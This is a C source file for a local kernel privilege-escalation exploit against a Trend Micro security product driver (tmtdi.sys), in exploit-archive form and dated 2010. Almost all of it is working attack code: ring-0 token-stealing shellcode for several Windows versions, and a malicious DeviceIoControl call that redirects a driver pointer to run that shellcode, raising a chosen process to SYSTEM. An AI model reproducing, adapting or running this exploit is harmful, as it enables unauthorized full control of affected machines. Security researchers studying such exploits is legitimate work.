/*
# Exploit Title: Trend Micro Titanium Maximum Security 2011 0day Local Kernel Exploit
# Date: 2010-11-01
# Author: Nikita Tarakanov (CISS Research Team)
# Software Link: http://us.trendmicro.com/us/products/personal/titanium-maximum-security/
# Version: up to date, version 3.0.1303, tmtdi.sys version 6.5.0.1234
# Tested on: Win XP SP3, Win Vista SP2, Win 7
# CVE : CVE-NO-MATCH
# Status : Unpatched
*/
#include <stdio.h>
#include "winsock2.h"
#include <windows.h>
 
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
 
 
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"
 
  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */
 
  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";
 
static unsigned char winvista_ring0_shell[] =
  /* _ring0 */
  "\x64\xa1\x24\x01\x00\x00"
  //"\x8b\x00"
  "\x8b\x70\x48"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x9c\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\xa4\x00\x00\x00"
  "\x2d\xa0\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"
 
  /* _cmd_eprocess_loop   */
  "\x8b\x98\x9c\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\xa4\x00\x00\x00"
  "\x2d\xa0\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */
 
  /* copy tokens!$%!      */
  "\x8b\x89\xe0\x00\x00\x00"
  "\x89\x88\xe0\x00\x00\x00"
  "\x90";
 
 
static unsigned char win7_ring0_shell[] =
  /* _ring0 */
  "\x64\xa1\x24\x01\x00\x00"
  "\x8b\x70\x50"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\xb4\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\xbc\x00\x00\x00"
  "\x2d\xb8\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"
 
  /* _cmd_eprocess_loop   */
  "\x8b\x98\xb4\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\xbc\x00\x00\x00"
  "\x2d\xb8\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */
 
  /* copy tokens!$%!      */
  "\x8b\x89\xf8\x00\x00\x00"
  "\x89\x88\xf8\x00\x00\x00"
  "\x90";
 
 
static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"
 
  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */
 
  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";
 
 
static unsigned char freeze[] =
  "\xeb\xfe";
 
 
 
DWORD WINAPI ResetPointer( LPVOID lpParam )
{
        HANDLE   hDevice;
        DWORD *inbuff;
        DWORD ioctl = 0x220404, in = 0x10, out = 0x0C, len;
 
        DWORD interval = 500;//enough?!
        Sleep(interval);
        inbuff = (DWORD *)malloc(0x1000);
        if(!inbuff){
                printf("malloc failed!\n");
                return 0;
        }
 
        *inbuff = 0;
        hDevice = (HANDLE)lpParam;
        DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, in, (LPVOID)inbuff, out, &len, NULL);
        free(inbuff);
 
        return 0;
}
 
static PCHAR fixup_ring0_shell (DWORD ppid, DWORD *zlen)
{
        DWORD dwVersion, dwMajorVersion, dwMinorVersion;
 
        dwVersion = GetVersion ();
        dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
        dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));
 
        printf("dwMajorVersion = %d dwMinorVersion %d\n", dwMajorVersion, dwMinorVersion);
 
        switch (dwMajorVersion)
        {
                case 5:
                        switch (dwMinorVersion)
                        {
                                case 1:
                                        *zlen = sizeof winxp_ring0_shell - 1;
                                        *(PDWORD) &winxp_ring0_shell[55] = ppid;
                                        return (winxp_ring0_shell);
                                case 2:
                                        *zlen = sizeof win2k3_ring0_shell - 1;
                                        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
                                        return (win2k3_ring0_shell);
 
                                default:
                                        printf("GetVersion, unsupported version\n");
                                        exit(EXIT_FAILURE);
                        }
 
                case 6:
                        switch (dwMinorVersion)
                        {
                                case 0:
                                        *zlen = sizeof winvista_ring0_shell - 1;
                                        *(PDWORD) &winvista_ring0_shell[54] = ppid;
                                        return (winvista_ring0_shell);
 
                                case 1:
                                        *zlen = sizeof win7_ring0_shell - 1;
                                        *(PDWORD) &win7_ring0_shell[54] = ppid;
                                        return (win7_ring0_shell);
 
                                default:
                                        printf("GetVersion, unsupported version\n");
                                        exit(EXIT_FAILURE);
                        }
 
                default:
                        printf("GetVersion, unsupported version\n");
                        exit(EXIT_FAILURE);
        }
 
        return (NULL);
}
 
 
int main(int argc, char **argv)
{
        HANDLE   hDevice, hThread;
        DWORD *inbuff;
        DWORD ioctl = 0x220404, in = 0x10, out = 0x0C, len, zlen, ppid;
        LPVOID zpage, zbuf;
 
        struct sockaddr_in service;
 
        // Initialize Winsock
        WSADATA wsaData;
        SOCKET ListenSocket;
        int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
 
 
        printf ("Trend Micro Titanium Maximum Security 2011 0day Local Kernel Exploit\n"
                  "by: Nikita Tarakanov (CISS Research Team)\n");
 
        if (iResult != NO_ERROR) printf("Error at WSAStartup()\n");
 
        if (argc <= 1)
        {
                printf("Usage: %s <processid to elevate>\n", argv[0]);
                return 0;
        }
 
        ppid = atoi(argv[1]);
 
        zpage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (zpage == NULL)
        {
                printf("VirtualAlloc failed\n");
                return 0;
        }
        printf("Ring 0 shellcode at 0x%08X address\n", zpage, 0x10000);
 
        memset(zpage, 0xCC, 0x1000);
        zbuf = fixup_ring0_shell(ppid, &zlen);
        memcpy((PCHAR)zpage, (PCHAR)zbuf, zlen);
        memcpy((PCHAR)zpage + zlen, (PCHAR)freeze, sizeof (freeze) - 1);
        if ( (hDevice = CreateFileA("\\\\.\\tmtdi",
                                                  GENERIC_READ|GENERIC_WRITE,
                                                  0,
                                                  0,
                                                  OPEN_EXISTING,
                                                  0,
                                                  NULL) ) != INVALID_HANDLE_VALUE )
        {
                printf("Device succesfully opened!\n");
        }
        else
        {
                printf("Error: Error opening device \n");
                return 0;
        }
 
        inbuff = (DWORD *)malloc(0x1000);
        if(!inbuff){
                printf("malloc failed!\n");
                return 0;
        }
 
        *inbuff = zpage;
        DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, in, (LPVOID)inbuff, out, &len, NULL);
        free(inbuff);
 
 
        hThread = CreateThread(NULL, 0, ResetPointer, hDevice, 0, NULL);
 
        if(!hThread){
                printf("CreateThread failed!\n");
        }
 
 
        ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (ListenSocket == INVALID_SOCKET) {
                printf("Error at socket: %ld\n", WSAGetLastError());
                WSACleanup();
                return 0 ;
        }
        service.sin_family = AF_INET;
        service.sin_addr.s_addr = inet_addr("127.0.0.1");
        service.sin_port = htons(27015);
 
        // Jump to shellcode
        if (bind( ListenSocket, (SOCKADDR*) &service, sizeof(service)) == SOCKET_ERROR) {
                printf("bind failed!\n");
                closesocket(ListenSocket);
                return 0 ;
        }
 
        WSACleanup();
 
 
        return 0;
 
}